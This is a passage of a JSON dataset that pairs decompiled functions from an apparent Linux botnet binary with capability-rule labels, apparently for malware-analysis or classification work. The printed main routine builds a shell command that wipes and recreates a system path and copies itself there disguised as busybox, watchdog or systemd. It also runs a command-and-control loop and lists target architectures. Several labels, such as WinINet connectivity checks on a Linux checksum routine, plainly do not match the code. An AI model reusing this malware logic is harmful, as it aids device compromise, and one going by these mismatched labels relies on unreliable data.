+ 1;\n            uVar18 = fcn.0805031f(*(iVar10 + -4 + iVar1), *0x8056528, uVar15, 0x4000);\n        } while (uVar16 + 1 != iVar13);\n    } while( true );\n}\n",
        "token_count": 1399
    },
    "0804bd80": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t fcn.0804bd80(uint16_t *param_1, uint32_t param_2)\n\n{\n    uint16_t uVar1;\n    uint32_t uVar2;\n    \n    uVar2 = 0;\n    if (1 < param_2) {\n        do {\n            uVar1 = *param_1;\n            param_2 = param_2 - 2;\n            param_1 = param_1 + 1;\n            uVar2 = uVar2 + uVar1;\n        } while (1 < param_2);\n    }\n    if (param_2 == 1) {\n        uVar2 = uVar2 + *param_1;\n    }\n    uVar2 = (uVar2 >> 0x10) + (uVar2 & 0xffff);\n    return (uVar2 + (uVar2 >> 0x10) ^ 0xffffffff) & 0xffff;\n}\n",
        "token_count": 204
    },
    "0804bdd0": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint64_t fcn.0804bdd0(int32_t param_1, uint16_t *param_2, uint16_t param_3, int32_t param_4)\n\n{\n    uint16_t uVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint uStack20;\n    \n    iVar3 = 0;\n    uStack20 = CONCAT22(param_3, uStack20);\n    if (1 < param_4) {\n        do {\n            uVar1 = *param_2;\n            param_4 = param_4 + -2;\n            param_2 = param_2 + 1;\n            iVar3 = iVar3 + uVar1;\n        } while (1 < param_4);\n    }\n    if (param_4 == 1) {\n        iVar3 = iVar3 + *param_2;\n    }\n    for (uVar2 = iVar3 + (*(param_1 + 0x10) >> 0x10) + *(param_1 + 9) * 0x100 +\n                 (*(param_1 + 0xc) >> 0x10) + (*(param_1 + 0xc) & 0xffff) + (*(param_1 + 0x10) & 0xffff) + param_3;\n        uVar2 >> 0x10 != 0; uVar2 = (uVar2 & 0xffff) + (uVar2 >> 0x10)) {\n    }\n    return (CONCAT44(uStack20, uVar2) ^ 0xffffffff) & 0xffffffff0000ffff;\n}\n",
        "token_count": 359
    },
    "null": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nuint main(int32_t param_1, uint *param_2)\n\n{\n    uint8_t uVar1;\n    uint8_t *puVar2;\n    uchar uVar3;\n    uint uVar4;\n    int32_t iVar5;\n    uint32_t uVar6;\n    int32_t iVar7;\n    uint *puVar8;\n    code *pcVar9;\n    uint *puVar10;\n    uint *puVar11;\n    uint *puVar12;\n    ulong uVar13;\n    uint32_t auStackY1636 [2];\n    int32_t *piStackY1628;\n    int32_t aiStackY1624 [2];\n    uint32_t auStack1600 [3];\n    uint *puStack1588;\n    int32_t aiStack1584 [5];\n    char acStack1564 [1024];\n    uint auStack540 [32];\n    uint auStack412 [32];\n    uchar auStack282 [198];\n    char *apcStack84 [12];\n    int32_t *piStack36;\n    int32_t iStack32;\n    ushort uStack26;\n    uchar *puStack24;\n    \n    iVar7 = param_1;\n    puStack24 = &stack0x00000004;\n    puVar10 = &stack0xfffff9c0;\n    *0x8056840 = 0;\n    puStack1588 = param_2;\n    *0x80588a8 = 1;\n    *0x80588a0 = fcn.0804e610();\n    fcn.0804e3d0();\n    *0x8056538 = 0x804d090;\n    uVar4 = fcn.0804db80();\n    iVar5 = fcn.0804e5b0(0x80588c0, 0x20, uVar4, uVar4);\n    if ((iVar7 == 2) && (iVar5 = fcn.0804e4f0(puStack1588[1]),  iVar5 < 0x20)) {\n        fcn.0804e540(0x80588c0, puStack1588[1]);\n        uVar4 = fcn.0804e4f0(puStack1588[1]);\n        fcn.0804e5b0(puStack1588[1], uVar4);\n    }\n    else {\n        fcn.0804e540(0x80588c0, 0x8054ea3, iVar5, iVar5);\n    }\n    apcStack84[3] = \"/bin/busybox\";\n    apcStack84[4] = \"/bin/watchdog\";\n    apcStack84[5] = \"/bin/systemd\";\n    apcStack84[0] = \"bin/busybox\";\n    apcStack84[1] = \"bin/watchdog\";\n    apcStack84[2] = \"bin/systemd\";\n    apcStack84[6] = 0x8054193;\n    apcStack84[7] = 0x8054193;\n    apcStack84[8] = 0x8054193;\n    uVar6 = fcn.0804db30();\n    uVar6 = uVar6 % 3;\n    fcn.0804e540(&stack0xfffffee6, \"rm -rf \");\n    uVar4 = *(&stack0xffffffac + uVar6 * 4);\n    fcn.0804e510(&stack0xfffffee6, uVar4);\n    fcn.0804e510(&stack0xfffffee6, \" && mkdir \");\n    fcn.0804e510(&stack0xfffffee6, *(&stack0xffffffc4 + uVar6 * 4));\n    fcn.0804e510(&stack0xfffffee6, 0x80541aa);\n    fcn.0804e510(&stack0xfffffee6, uVar4);\n    fcn.0804e510(&stack0xfffffee6, \" &&  mv \");\n    fcn.0804e510(&stack0xfffffee6, *puStack1588);\n    fcn.0804e510(&stack0xfffffee6, \" \");\n    fcn.0804e510(&stack0xfffffee6, uVar4);\n    fcn.0804e510(&stack0xfffffee6, \"; chmod 777 \");\n    fcn.0804e510(&stack0xfffffee6, uVar4);\n    fcn.08051618(&stack0xfffffee6);\n    uVar4 = *(&stack0xffffffb8 + uVar6 * 4);\n    fcn.0804e540(*puStack1588, uVar4);\n    fcn.0804ebc8(0xf, uVar4);\n    fcn.0804e350(2);\n    uVar4 = fcn.0804e2a0(2, &stack0xffffffdc);\n    fcn.0804ed18(1, uVar4, piStack36);\n    fcn.0804ed18(1, 0x8053503, 1);\n    fcn.0804e2d0(2);\n    iVar7 = fcn.0804ead9();\n    if (0 < iVar7) {\n        return 0;\n    }\n    *0x8056848 = fcn.0804ec7c();\n    fcn.0804eaab(0);\n    fcn.0804eaab(1);\n    fcn.0804eaab(2);\n    fcn.08048700();\n    fcn.0804cfb0();\n    fcn.0804c3c0();\n    aiStack1584[0] = 0;\n    puVar12 = &stack0xfffffde4;\n    puVar11 = &stack0xfffffe64;\ncode_r0x0804d3f5:\n    while( true ) {\n        do {\n            puVar8 = puVar12;\n            for (iVar7 = 0x20; iVar7 != 0; iVar7 = iVar7 + -1) {\n                *puVar8 = 0;\n                puVar8 = puVar8 + 1;\n            }\n            puVar8 = puVar11;\n            for (iVar7 = 0x20; iVar7 != 0; iVar7 = iVar7 + -1) {\n                *puVar8 = 0;\n                puVar8 = puVar8 + 1;\n            }\n            if (*0x8056530 != 0xffffffff) {\n                puVar2 = puVar10 + ((*0x8056530 & 0x1f) >> 3) + (*0x8056530 >> 5) * 4 + 0x424;\n                *puVar2 = *puVar2 | '\\x01' << (*0x8056530 & 7);\n            }\n            if (*0x8056534 == 0xffffffff) {\n                puVar10[-1] = 0;\n                puVar10[-2] = 0;\n                puVar10[-3] = 1;\n                puVar10[-4] = 2;\n                puVar10[-5] = 0x804d64c;\n                uVar13 = fcn.080503d0();\n                *0x8056534 = uVar13;\n                if (*0x8056534 != 0xffffffff) {\n                    puVar10[-1] = uVar13 >> 0x20;\n                    puVar10[-2] = 0;\n                    puVar10[-3] = 3;\n                    puVar10[-4] = *0x8056534;\n                    puVar10[-5] = 0x804d668;\n                    uVar6 = fcn.0804e9ed();\n                    puVar10[-2] = uVar6 | 0x800;\n                    puVar10[-3] = 4;\n                    puVar10[-4] = *0x8056534;\n                    puVar10[-5] = 0x804d67c;\n                    fcn.0804e9ed();\n                    pcVar9 = *0x8056538;\n                    if (*0x8056538 != NULL) {\n                        puVar10[-1] = 0x804d68a;\n                        pcVar9 = (**0x8056538)();\n                    }\n                    *0x8056844 = '\\x01';\n                    puVar10[-1] = pcVar9;\n                    puVar10[-2] = 0x10;\n                    puVar10[-3] = 0x80588e8;\n                    puVar10[-4] = *0x8056534;\n                    puVar10[-5] = 0x804d6a4;\n                    fcn.080501f5();\n                }\n            }\n            if (*0x8056844 == '\\0') {\n                puVar2 = puVar10 + ((*0x8056534 & 0x1f) >> 3) + (*0x8056534 >> 5) * 4 + 0x424;\n                *puVar2 = *puVar2 | '\\x01' << (*0x8056534 & 7);\n            }\n            else {\n                puVar2 = puVar10 + ((*0x8056534 & 0x1f) >> 3) + (*0x8056534 >> 5) * 4 + 0x4a4;\n                *puVar2 = *puVar2 | '\\x01' << (*0x8056534 & 7);\n            }\n            puVar8 = *0x8056530;\n            if (*0x8056530 < *0x8056534) {\n                puVar8 = *0x8056534;\n            }\n            puVar10[0x185] = 0;\n            puVar10[0x184] = 10;\n            puVar10[-4] = puVar10 + 0x184;\n            puVar10[-5] = 0;\n            puVar10[-6] = puVar11;\n            puVar10[-7] = puVar12;\n            puVar10[-8] = puVar8 + 1;\n            puVar10[-9] = 0x804d491;\n            iVar7 = fcn.0804ec3d();\n        } while (iVar7 == -1);\n        if (iVar7 == 0) {\n            iVar7 = puVar10[4];\n            *(puVar10 + 0x626) = 0;\n            puVar10[4] = puVar10[4] + 1;\n            if (iVar7 % 6 == 0) {\n                puVar10[-1] = 0x4000;\n                puVar10[-2] = 2;\n                puVar10[-3] = puVar10 + 0x626;\n                puVar10[-4] = *0x8056534;\n                puVar10[-5] = 0x804d6ca;\n                fcn.0805031f();\n            }\n        }\n        puVar8 = *0x8056838;\n        if (((*0x8056838 == NULL) && (*0x8056530 != 0xffffffff)) &&\n           ((*(puVar10 + ((*0x8056530 & 0x1f) >> 3) + (*0x8056530 >> 5) * 4 + 0x424) >> (*0x8056530 & 7) & 1) != 0)) {\n            puVar10[0x188] = 0x10;\n            puVar10[-1] = piStack36;\n            puVar10[-2] = puVar10 + 0x188;\n            puVar10[-3] = puVar10 + 0x177;\n            puVar10[-4] = *0x8056530;\n            puVar10[-5] = 0x804d8e7;\n            fcn.0805019f();\n            puVar10[-5] = 0x804d8ec;\n            fcn.0804ce30();\n            puVar10[-5] = 0x804d8f1;\n            fcn.08048250();\n            goto code_r0x0804d8f1;\n        }\n        if (*0x8056844 == '\\0') goto code_r0x0804d5a1;\n        *0x8056844 = '\\0';\n        if ((*(puVar10 + ((*0x8056534 & 0x1f) >> 3) + (*0x8056534 >> 5) * 4 + 0x4a4) >> (*0x8056534 & 7) & 1) == 0)\n        break;\n        puVar10[0x188] = 0;\n        puVar10[0x186] = 4;\n        puVar10[-4] = puVar10 + 0x186;\n        puVar10[-5] = puVar10 + 0x188;\n        puVar10[-6] = 4;\n        puVar10[-7] = 1;\n        puVar10[-8] = *0x8056534;\n        puVar10[-9] = 0x804d705;\n        fcn.0805024b();\n        if (puVar10[0x188] != 0) goto code_r0x0804d713;\n        puVar10[-1] = 0x804d737;\n        *0x80588a0 = fcn.0804e610();\n        puVar10[-4] = 0x80588c0;\n        puVar10[-5] = 0x804d749;\n        uVar3 = fcn.0804e4f0();\n        *(puVar10 + 0x626) = uVar3;\n        puVar10[-3] = 0x40;\n        piStack36 = puVar10 + 0x58a;\n        puVar10[-4] = piStack36;\n        puVar10[-5] = 0x804d761;\n        fcn.0804e5b0();\n        puVar10[-2] = 3;\n        puVar10[-3] = 0x80541c4;\n        puVar10[-4] = piStack36;\n        puVar10[-5] = 0x804d771;\n        fcn.0804e580();\n        puVar10[-2] = 2;\n        puVar10[-3] = puVar10 + 0x626;\n        puVar10[-4] = puVar10 + 0x58d;\n        puVar10[-5] = 0x804d78b;\n        fcn.0804e580();\n        puVar10[-2] = *(puVar10 + 0x626);\n        puVar10[-3] = 0x80588c0;\n        puVar10[-4] = puVar10 + 0x58e;\n        puVar10[-5] = 0x804d7aa;\n        fcn.0804e580();\n        puVar10[-5] = 0x4000;\n        puVar10[-6] = *(puVar10 + 0x626) + 4;\n        puVar10[-7] = piStack36;\n        puVar10[-8] = *0x8056534;\n        puVar10[-9] = 0x804d7c9;\n        fcn.0805031f();\n        puVar10[-3] = 0x40;\n        puVar10[-4] = piStack36;\n        puVar10[-5] = 0x804d7d4;\n        fcn.0804e5b0();\n    }\n    if (*0x8056534 != 0xffffffff) {\n        puVar10[-4] = *0x8056534;\n        puVar10[-5] = 0x804d542;\n        fcn.0804eaab();\n    }\n    goto code_r0x0804d545;\ncode_r0x0804d5a1:\n    if ((*0x8056534 == 0xffffffff) ||\n       ((*(puVar10 + ((*0x8056534 & 0x1f) >> 3) + (*0x8056534 >> 5) * 4 + 0x424) >> (*0x8056534 & 7) & 1) == 0))\n    goto code_r0x0804d3f5;\n    puVar10[-1] = 0x804d5d0;\n    piStack36 = fcn.0804efb0();\n    *piStack36 = 0;\n    puVar10[-1] = 0x4000;\n    puVar10[-2] = 0x400;\n    puVar8 = puVar10 + 9;\n    puVar10[-3] = puVar8;\n    puVar10[-4] = *0x8056534;\n    puVar10[-5] = 0x804d5f3;\n    uVar13 = fcn.080502a9();\n    iVar7 = uVar13;\n    if (iVar7 < 1) {\n        if ((*piStack36 != 0xb) && (*piStack36 != 4)) {\ncode_r0x0804d713:\n            if (*0x8056534 != 0xffffffff) {\n                puVar10[-4] = *0x8056534;\n                puVar10[-5] = 0x804d72a;\n                fcn.0804eaab();\n            }\ncode_r0x0804d545:\n            *0x8056534 = 0xffffffff;\n            puVar10[-1] = 0x804d554;\n            uVar6 = fcn.0804db30();\n            puVar10[1] = uVar6 * 0xcccccccd >> 0x20;\n            *puVar10 = uVar6 * 0xcccccccd;\n            piStack36 = uVar6 + (puVar10[1] >> 3) * -10;\n            puVar10[-4] = piStack36 + 1;\n            puVar10[-5] = 0x804d57f;\n            fcn.08051819();\n        }\n        goto code_r0x0804d3f5;\n    }\n    uVar1 = *(puVar10 + 9);\n    uVar6 = uVar13 >> 0x20 & 0xffffff00 | uVar1;\n    if (uVar1 == 0x99) {\n        if (*(puVar10 + 0x25) == 'f') {\n            if (*(puVar10 + 0x26) == '3') {\n                puVar10[-4] = \"ping\";\n                puVar10[-5] = 0x804da76;\n                uVar3 = fcn.0804e4f0();\n                *(puVar10 + 0x626) = uVar3;\n                puVar10[-3] = 0x40;\n                piStack36 = puVar10 + 0x58a;\n                puVar10[-4] = piStack36;\n                puVar10[-5] = 0x804da8e;\n                fcn.0804e5b0();\n                puVar10[-2] = 3;\n                puVar10[-3] = 0x80541cd;\n                puVar10[-4] = piStack36;\n                puVar10[-5] = 0x804da9e;\n                fcn.0804e580();\n                puVar10[-2] = 2;\n                puVar10[-3] = puVar10 + 0x626;\n                puVar10[-4] = puVar10 + 0x58d;\n                puVar10[-5] = 0x804dab8;\n                fcn.0804e580();\n                puVar10[-2] = *(puVar10 + 0x626);\n                puVar10[-3] = \"ping\";\n                puVar10[-4] = puVar10 + 0x58e;\n                puVar10[-5] = 0x804dad7;\n                fcn.0804e580();\n                puVar10[-5] = 0x4000;\n                puVar10[-6] = *(puVar10 + 0x626) + 4;\n                puVar10[-7] = piStack36;\n                puVar10[-8] = *0x8056534;\n                puVar10[-9] = 0x804daf5;\n                fcn.0805031f();\n                goto code_r0x0804d629;\n            }\n            if (*(puVar10 + 0x26) != 'f') goto code_r0x0804d629;\n            if (*0x8056834 == 0) {\n                *0x8056834 = 1;\n                goto code_r0x0804d3f5;\n            }\n            *0x8056838 = 0x1;\n            puVar10[-4] = *0x8056530;\n            puVar10[-5] = 0x804db15;\n            fcn.0804eaab();\n            puVar8 = *0x8056534;\n            puVar11 = puVar10[-4];\n            puVar10[-4] = *0x8056534;\n            puVar10[-5] = 0x804db22;\n            fcn.0804eaab();\ncode_r0x0804d8f1:\n            piStack36 = puVar10[-4];\n            puVar12 = puVar10[-3];\n            puVar10[-3] = 9;\n            puVar10[-4] = -*0x8056848;\n            puVar10[-5] = 0x804d902;\n            fcn.0804eb4b();\n            puVar10[-4] = 0;\n            puVar10[-5] = 0x804d90e;\n            fcn.08051749();\n            puVar10 = puVar10 + -4;\ncode_r0x0804d90e:\n            if (*0x8056840 != 1) goto code_r0x0804d629;\n            *(puVar10 + -4) = *0x805683c;\n            *(puVar10 + -8) = \"webserv\";\n            *(puVar10 + -0xc) = \"%s:%d\";\n            piStack36 = puVar10 + 0x5ca;\n            *(puVar10 + -0x10) = piStack36;\n            *(puVar10 + -0x14) = 0x804d939;\n            fcn.0804f011();\n            *(puVar10 + -0x10) = piStack36;\n            *(puVar10 + -0x14) = 0x804d941;\n            uVar3 = fcn.0804e4f0();\n            *(puVar10 + 0x626) = uVar3;\n            *(puVar10 + -0xc) = 0x40;\n            *(puVar10 + -0x10) = puVar10 + 0x58a;\n            *(puVar10 + -0x14) = 0x804d959;\n            fcn.0804e5b0();\n            *(puVar10 + -8) = 3;\n            *(puVar10 + -0xc) = 0x80541cd;\n            *(puVar10 + -0x10) = puVar10 + 0x58a;\n            *(puVar10 + -0x14) = 0x804d970;\n            fcn.0804e580();\n            *(puVar10 + -8) = 2;\n            *(puVar10 + -0xc) = puVar10 + 0x626;\n            *(puVar10 + -0x10) = puVar10 + 0x58d;\n            *(puVar10 + -0x14) = 0x804d98a;\n            fcn.0804e580();\n            *(puVar10 + -8) = *(puVar10 + 0x626);\n            *(puVar10 + -0xc) = piStack36;\n            *(puVar10 + -0x10) = puVar10 + 0x58e;\n            *(puVar10 + -0x14) = 0x804d9a5;\n            fcn.0804e580();\n            *(puVar10 + -0x14) = 0x4000;\n            *(puVar10 + -0x18) = *(puVar10 + 0x626) + 4;\n            *(puVar10 + -0x1c) = puVar10 + 0x58a;\n            *(puVar10 + -0x20) = *0x8056534;\n            *(puVar10 + -0x24) = 0x804d9ca;\n            fcn.0805031f();\n            *(puVar10 + -0xc) = 0x40;\n            *(puVar10 + -0x10) = puVar10 + 0x58a;\n            *(puVar10 + -0x14) = 0x804d9dc;\n            iVar7 = fcn.0804e5b0();\ncode_r0x0804d846:\n            if (*(puVar10 + 0x26) == '3') {\n                if (*0x8056840 != 1) goto code_r0x0804d629;\n                *(puVar10 + -4) = iVar7;\n                *(puVar10 + -8) = iVar7;\n                *(puVar10 + -0xc) = 0;\n                *(puVar10 + -0x10) = 0x8053e17;\n                *(puVar10 + -0x14) = 0x804d9ff;\n                fcn.0804e690();\n                *(puVar10 + -0xc) = 0;\n                *(puVar10 + -0x10) = \"arm7\";\n                *(puVar10 + -0x14) = 0x804da0d;\n                fcn.0804e690();\n                *(puVar10 + -0xc) = 0;\n                *(puVar10 + -0x10) = \"mips\";\n                *(puVar10 + -0x14) = 0x804da1b;\n                fcn.0804e690();\n                *(puVar10 + -0xc) = 0;\n                *(puVar10 + -0x10) = \"mipsel\";\n                *(puVar10 + -0x14) = 0x804da29;\n                fcn.0804e690();\n                *(puVar10 + -0xc) = 0;\n                *(puVar10 + -0x10) = \"x86_64\";\n                *(puVar10 + -0x14) = 0x804da37;\n                fcn.0804e690();\n                *(puVar10 + -0xc) = 0;\n                *(puVar10 + -0x10) = 0x8053e33;\n                *(puVar10 + -0x14) = 0x804da45;\n                fcn.0804e690();\n                *(puVar10 + -0xc) = 0;\n                *(puVar10 + -0x10) = 0x8053e37;\n                *(puVar10 + -0x14) = 0x804da53;\n                fcn.0804e690();\n                piStack36 = *(puVar10 + -0xc);\n                *(puVar10 + -0xc) = 0;\n                *(puVar10 + -0x10) = \"m68k\";\n                *(puVar10 + -0x14) = 0x804da61;\n                fcn.0804e690();\n            }\n            if ((*(puVar10 + 0x26) == 'f') && (*0x8056840 != 1)) {\n                *(puVar10 + -4) = 0x804d86e;\n                uVar6 = fcn.0804db30();\n                *0x805683c = uVar6 % 0xfbff + 0x400;\n                *(puVar10 + -0x10) = *0x805683c;\n                *(puVar10 + -0x14) = 0x804d88e;\n                fcn.0804c120();\n                *0x8056840 = 1;\n            }\n            goto code_r0x0804d629;\n        }\n    }\n    else if (uVar1 == 0x33) {\n        if (*(puVar10 + 0x25) == 'f') {\n            if (*(puVar10 + 0x26) == -0x67) goto code_r0x0804d90e;\n            goto code_r0x0804d846;\n        }\n    }\n    else if ((uVar1 == 0x66) && (*(puVar10 + 0x25) == 'f')) {\n        if (*(puVar10 + 0x26) == -0x67) {\n            *0x80588a8 = 1;\n        }\n        goto code_r0x0804d629;\n    }\n    puVar10[-1] = uVar6;\n    puVar10[-2] = uVar6;\n    puVar10[-3] = iVar7;\n    puVar10[-4] = puVar8;\n    puVar10[-5] = 0x804d626;\n    fcn.080483a0();\ncode_r0x0804d629:\n    *(puVar10 + -4) = piStack36;\n    *(puVar10 + -8) = piStack36;\n    *(puVar10 + -0xc) = 0x400;\n    *(puVar10 + -0x10) = puVar8;\n    *(puVar10 + -0x14) = 0x804d636;\n    fcn.0804e5b0();\n    goto code_r0x0804d3f5;\n}\n",
        "token_count": 6616
    },
    "0804dcd0": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0804dcd0(uint32_t *param_1, int32_t param_2)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    uint32_t uStack20;\n    \n    if (0 < param_2) {\n        uStack20 = *0x8056854;\n        uVar2 = *0x805684c;\n        uVar1 = uStack20;\n        do {\n            uStack20 = uVar1;\n            *0x8056854 = *0x8056858;\n            *0x805684c = *0x8056850;\n            if (param_2 < 4) {\n                if (param_2 == 1) {\n                    uVar2 = uVar2 << 0xb ^ uVar2;\n                    *0x8056850 = uStack20;\n                    *0x8056858 = uVar2 >> 8 ^ uVar2 ^ *0x8056854 >> 0x13 ^ *0x8056854;\n                    *param_1 = *0x8056858;\n                    return;\n                }\n                param_2 = param_2 + -2;\n                uVar2 = uVar2 << 0xb ^ uVar2;\n                *0x8056858 = uVar2 >> 8 ^ uVar2 ^ *0x8056854 >> 0x13 ^ *0x8056854;\n                *param_1 = *0x8056858;\n                param_1 = param_1 + 2;\n            }\n            else {\n                param_2 = param_2 + -4;\n                uVar2 = uVar2 << 0xb ^ uVar2;\n                *0x8056858 = uVar2 >> 8 ^ uVar2 ^ *0x8056854 >> 0x13 ^ *0x8056854;\n                *param_1 = *0x8056858;\n                param_1 = param_1 + 1;\n            }\n            uVar2 = *0x805684c;\n            *0x8056850 = uStack20;\n            uVar1 = *0x8056854;\n        } while (0 < param_2);\n        *0x8056850 = uStack20;\n    }\n    return;\n}\n",
        "token_count": 498
    },
    "0804e350": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.0804e350(uint8_t param_1)\n\n{\n    int32_t iVar1;\n    int32_t *piVar2;\n    uint32_t uVar3;\n    uint uVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    \n    uVar4 = *0x805653c;\n    iVar1 = param_1 * 8;\n    piVar2 = iVar1 + 0x8058900;\n    if (*(iVar1 + 0x8058904) != 0) {\n        uVar3 = *0x805653c >> 0x18;\n        iVar5 = 0;\n        do {\n            *(iVar5 + *piVar2) = *(iVar5 + *piVar2) ^ uVar4;\n            *(iVar5 + *piVar2) = *(iVar5 + *piVar2) ^ uVar4 >> 8;\n            *(iVar5 + *piVar2) = *(iVar5 + *piVar2) ^ uVar4 >> 0x10;\n            iVar6 = iVar5 + 1;\n            *(iVar5 + *piVar2) = *(iVar5 + *piVar2) ^ uVar3;\n            iVar5 = iVar6;\n        } while (iVar6 < (*(iVar1 + 0x8058904) & 0xffff));\n    }\n    return;\n}\n",
        "token_count": 299
    },
    "0804e4f0": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.0804e4f0(char *param_1)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    \n    iVar2 = 0;\n    cVar1 = *param_1;\n    while (cVar1 != '\\0') {\n        iVar2 = iVar2 + 1;\n        cVar1 = param_1[iVar2];\n    }\n    return;\n}\n",
        "token_count": 87
    },
    "0804e510": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.0804e510(char *param_1, char *param_2)\n\n{\n    char *pcVar1;\n    char cVar2;\n    \n    cVar2 = *param_1;\n    while (cVar2 != '\\0') {\n        param_1 = param_1 + 1;\n        cVar2 = *param_1;\n    }\n    cVar2 = *param_2;\n    while (cVar2 != '\\0') {\n        *param_1 = cVar2;\n        param_1 = param_1 + 1;\n        pcVar1 = param_2 + 1;\n        param_2 = param_2 + 1;\n        cVar2 = *pcVar1;\n    }\n    return;\n}\n",
        "token_count": 164
    },
    "0804e540": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t fcn.0804e540(char *param_1, char *param_2)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    \n    if (*param_2 == '\\0') {\n        iVar1 = 0;\n        iVar2 = 0;\n    }\n    else {\n        iVar1 = 0;\n        do {\n            iVar1 = iVar1 + 1;\n        } while (param_2[iVar1] != '\\0');\n        iVar2 = iVar1;\n        if (iVar1 == -1) {\n            return -1;\n        }\n    }\n    do {\n        iVar1 = iVar1 + -1;\n        *param_1 = *param_2;\n        param_2 = param_2 + 1;\n        param_1 = param_1 + 1;\n    } while (iVar1 != -1);\n    return iVar2;\n}\n",
        "token_count": 193
    },
    "0804e9ed": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nuint32_t fcn.0804e9ed(uint param_1, int32_t param_2, uint param_3)\n\n{\n    code *pcVar1;\n    uint32_t uVar2;\n    int32_t *piVar3;\n    \n    if (param_2 - 0xcU < 3) {\n        uVar2 = fcn.0804ea44(param_1, param_2, param_3, param_2 - 0xcU);\n    }\n    else {\n        pcVar1 = swi(0x80);\n        uVar2 = (*pcVar1)();\n        if (0xfffff000 < uVar2) {\n            piVar3 = fcn.0804efb0();\n            *piVar3 = -uVar2;\n            uVar2 = 0xffffffff;\n        }\n    }\n    return uVar2;\n}\n",
        "token_count": 189
    },
    "0804f2ad": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Type propagation algorithm not settling\n\nint32_t fcn.0804f2ad(uint param_1, char *param_2, uint param_3)\n\n{\n    int32_t iVar1;\n    char **ppcVar2;\n    char *pcVar3;\n    char *pcVar4;\n    int32_t iVar5;\n    uint32_t extraout_ECX;\n    unkbyte10 *pVar6;\n    uint32_t uVar7;\n    uint8_t uVar8;\n    uint32_t unaff_EBP;\n    char **ppcVar9;\n    uint32_t uVar10;\n    unkbyte9 Var11;\n    ulong uVar12;\n    int32_t iStack364;\n    char cStack357;\n    char *pcStack356;\n    char *pcStack348;\n    char **ppcStack344;\n    char *pcStack340;\n    uint32_t uStack332;\n    char cStack328;\n    int32_t iStack324;\n    int32_t iStack320;\n    uint32_t uStack316;\n    uint uStack312;\n    unkbyte10 Stack280;\n    unkbyte10 aStack268 [10];\n    char acStack160 [127];\n    uchar uStack33;\n    char *apcStack32 [2];\n    int32_t iStack24;\n    unkbyte10 *pStack20;\n    \n    ppcVar9 = &pcStack348;\n    iVar1 = fcn.0804f855(ppcVar9, param_2);\n    if (iVar1 < 0) {\n        uVar12 = fcn.0804ff0e(pcStack348);\n        if (uVar12 != 0) {\n            fcn.08052624(pcStack348, uVar12, param_1, uVar12 >> 0x20);\n        }\n    }\n    else {\n        fcn.0804f8c4(ppcVar9, param_3, iVar1, iVar1);\n        iStack364 = 0;\n        pcVar3 = param_2;\ncode_r0x0804f32d:\n        do {\n            while( true ) {\n                while( true ) {\n                    for (; (*pcVar3 != '\\0' && (*pcVar3 != '%')); pcVar3 = pcVar3 + 1) {\n                    }\n                    if (pcVar3 != param_2) {\n                        ppcVar2 = NULL;\n                        ppcVar9 = pcVar3 + -param_2;\n                        if (0 < ppcVar9) {\n                            ppcVar2 = fcn.08052624(param_2, ppcVar9, param_1, unaff_EBP);\n                        }\n                        if (ppcVar2 != ppcVar9) {\n                            return 0xffffffff;\n                        }\n                        iStack364 = iStack364 + ppcVar9;\n                    }\n                    if (*pcVar3 == '\\0') {\n                        return iStack364;\n                    }\n                    param_2 = pcVar3 + 1;\n                    if (pcVar3[1] != '%') break;\n                    pcVar3 = pcVar3 + 2;\n                }\n                iStack24 = 0;\n                pcStack348 = param_2;\n                fcn.0804fa3e(&pcStack348);\n                fcn.0804f906(&pcStack348);\n                uVar10 = uStack312._2_1_;\n                pVar6 = aStack268;\n                if (0 < 